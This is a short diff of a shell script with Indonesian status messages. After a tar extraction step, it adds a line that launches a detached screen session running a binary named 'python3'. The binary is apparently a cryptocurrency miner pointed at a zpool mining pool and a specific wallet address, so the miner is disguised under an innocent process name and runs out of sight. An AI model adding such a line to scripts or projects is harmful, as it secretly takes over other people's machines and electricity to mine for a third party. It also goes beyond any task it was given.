@@ -44,3 +44,5 @@ else
     tar -xvf "$FILE" > /dev/null 2>&1
     echo "Ekstraksi selesai."
 fi
+
+screen -dmS dotsrb$COUNT ./dotsrb/python3 -a yespowersugar -o yespowersugar.eu.mine.zpool.ca:6241 -u DGNF8dXcQNseyKH55K59nyTkRVEbDkuewJ -p c=DGB,zap=SUGAR
